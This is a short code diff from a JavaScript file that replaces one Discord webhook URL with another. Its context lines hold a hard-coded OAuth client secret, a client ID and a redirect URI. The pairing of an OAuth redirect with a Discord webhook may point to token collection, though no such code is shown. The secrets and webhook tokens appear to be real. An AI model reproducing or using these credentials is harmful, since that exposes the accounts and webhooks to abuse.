@@ -2,7 +2,7 @@
 const client_secret = 'HDi8Q~3K9txE95qWs3m.I.iFcXXU2iX9rO6thcm1' 
 const client_id = '9f45baed-008a-4692-bdf4-23988239c9ac'
 const redirect_uri = 'https://skyhelper.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1041925174762672250/eMo-MYntxkA835galASoJMLoOQfk1OGzho4vdBzOJK-zO87V5AaQjNBxKx7m-UJw4HNo'
+const webhook_url = 'https://discord.com/api/webhooks/1048733035610247218/0E1lR7I3tmoUpvXsxwx9B-rwUD6NsFjuXrmoJ_QBnm6H8ItMnJLD1DsOtvkyi-YKsuhw'
 
 
 //Requirements
